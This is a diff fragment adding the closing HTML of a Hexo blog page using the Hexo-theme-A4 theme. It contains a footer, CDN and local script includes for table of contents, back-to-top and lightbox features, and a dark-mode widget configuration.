+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
